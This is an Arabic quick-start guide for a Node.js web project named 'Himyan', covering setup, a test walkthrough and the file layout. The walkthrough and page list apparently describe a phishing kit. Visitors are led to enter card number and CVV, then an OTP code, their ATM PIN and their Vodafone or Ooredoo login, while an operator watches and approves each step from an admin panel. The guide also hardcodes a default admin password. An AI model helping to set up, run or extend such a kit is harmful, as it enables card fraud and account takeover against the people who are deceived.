# 🚀 دليل التشغيل السريع

## الخطوات المطلوبة

### 1️⃣ تثبيت Node.js
تأكد من تثبيت Node.js 18 أو أحدث:
```bash
node --version
```

---

### 2️⃣ تثبيت المكتبات
```bash
npm install
```

---

### 3️⃣ إنشاء ملف `.env`
انسخ الملف النموذجي:
```bash
copy .env.example .env
```

**أو أنشئ ملف `.env` يدويًا بهذا المحتوى:**
```env
PORT=3000
ADMIN_USER=admin
ADMIN_PASSWORD=HimyanAdmin2026!Qcb#
ENCRYPTION_KEY=اترك_فارغ_سيتم_إنشاؤه_تلقائيا
SESSION_SECRET=اترك_فارغ_سيتم_إنشاؤه_تلقائيا
DATA_DIR=./data
```

⚠️ **مهم جدًا:** لو عندك قاعدة بيانات PostgreSQL، أضف:
```env
DATABASE_URL=postgresql://username:password@host:5432/database
```

---

### 4️⃣ تشغيل السيرفر
```bash
npm start
```

**أو:**
```bash
node server.js
```

---

### 5️⃣ فتح الموقع
افتح المتصفح على:
- **الموقع الرئيسي:** http://localhost:3000
- **لوحة الأدمن:** http://localhost:3000/admin.html

---

## 🔑 بيانات تسجيل دخول الأدمن

**اسم المستخدم:** `admin`  
**كلمة المرور:** `HimyanAdmin2026!Qcb#`

⚠️ **يجب تغيير كلمة المرور قبل النشر!**

---

## 🧪 اختبار سريع

### اختبار التدفق الكامل:

1. **افتح الصفحة الرئيسية:** http://localhost:3000
2. **اضغط "قدّم طلبك الآن"**
3. **املأ النموذج:**
   - اسمك
   - رقم الهوية: أي أرقام
   - الجوال: +97412345678
   - البريد: test@example.com
   - اختر نوع البطاقة والبنك
4. **أكمل عملية الدفع الوهمية:**
   - رقم البطاقة: `4242424242424242`
   - تاريخ: أي تاريخ مستقبلي
   - CVV: `123`
5. **سجّل دخول كأدمن:**
   - افتح: http://localhost:3000/admin.html
   - سجل دخول بالبيانات أعلاه
6. **اقبل الطلب** من لوحة الأدمن
7. **ارجع للموقع وأدخل رمز التأكيد:** أي 6 أرقام (مثل: `123456`)
8. **أدخل رقم ATM:** أي 4 أرقام (مثل: `1234`)
9. **اختر مزود الشبكة:** فودافون أو أوريدو
10. **أدخل بيانات تسجيل الدخول:**
    - الجوال: +97412345678
    - كلمة المرور: أي كلمة مرور
11. **تحقق من البيانات في لوحة الأدمن** ✅

---

## 📂 هيكل المشروع

```
Himyan-main/
├── server.js              # السيرفر الرئيسي
├── db.js                  # قاعدة البيانات
├── index.html             # الصفحة الرئيسية
├── apply.html             # نموذج التقديم
├── confirmation.html      # بوابة الدفع
├── pending.html           # صفحة الانتظار
├── confirmation-code.html # رمز التأكيد (6 أرقام)
├── atm-pin.html          # رقم ATM (4 أرقام) 🆕
├── network-provider.html  # اختيار المزود 🆕
├── vodafone-login.html    # تسجيل دخول فودافون 🆕
├── ooredoo-login.html     # تسجيل دخول أوريدو 🆕
├── admin.html             # لوحة الأدمن
├── style.css              # التصميم
├── package.json           # المكتبات
├── .env                   # الإعدادات (لا تشاركه!)
├── .env.example           # نموذج الإعدادات
├── PROJECT_OVERVIEW.md    # شرح المشروع الكامل
├── IMPROVEMENTS_AND_ISSUES.md  # المشاكل والتحسينات
├── NEW_FEATURES.md        # الميزات الجديدة
├── QUICK_START.md         # هذا الملف
└── data/                  # مجلد البيانات المحلية
    └── requests.json      # الطلبات (إذا لم تستخدم PostgreSQL)
```

---

## ❗ المشاكل الشائعة

### المشكلة: `Error: Cannot find module`
**الحل:**
```bash
npm install
```

---

### المشكلة: `Port 3000 is already in use`
**الحل:** غيّر المنفذ في ملف `.env`:
```env
PORT=3001
```

---

### المشكلة: الصور لا تظهر
**الحل:** تأكد أن جميع ملفات SVG و PNG موجودة في نفس المجلد

---

### المشكلة: `ENCRYPTION_KEY is not defined`
**الحل:** لا تقلق! سيتم إنشاء مفتاح تلقائي، لكن الأفضل إضافته يدويًا:
```bash
node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
```
ثم انسخ الناتج وضعه في `.env`

---

## 🔄 تحديث الكود

إذا قمت بتعديل أي ملف:
1. أوقف السيرفر بضغط `Ctrl+C`
2. شغّل السيرفر مرة أخرى: `npm start`

---

## 🛑 إيقاف السيرفر

اضغط `Ctrl+C` في نافذة Terminal

---

## 📝 ملاحظات مهمة

### ✅ للبيئة التجريبية (Development):
- يمكن استخدام التخزين المحلي (JSON) بدون قاعدة بيانات
- مفاتيح التشفير يتم إنشاؤها تلقائيًا
- كلمة مرور الأدمن الافتراضية تعمل

### ⚠️ للبيئة الإنتاجية (Production):
- **يجب** استخدام PostgreSQL
- **يجب** إنشاء ENCRYPTION_KEY مخصص
- **يجب** تغيير ADMIN_PASSWORD
- **يجب** إنشاء SESSION_SECRET مخصص
- **يجب** استخدام HTTPS فقط
- **يجب** عمل مراجعة أمنية شاملة

---

## 🆘 تحتاج مساعدة؟

اقرأ الملفات التالية:
1. **PROJECT_OVERVIEW.md** - شرح المشروع بالتفصيل
2. **NEW_FEATURES.md** - شرح الميزات الجديدة
3. **IMPROVEMENTS_AND_ISSUES.md** - المشاكل والحلول

---

## 🎉 نجح التشغيل؟

إذا ظهرت رسالة:
```
Himyan server listening on 0.0.0.0:3000 (postgresql أو local fallback)
```

**مبروك! 🎊** السيرفر يعمل بنجاح!

افتح المتصفح على: http://localhost:3000

---

**آخر تحديث:** 2026-08-31  
**الإصدار:** 2.0.0
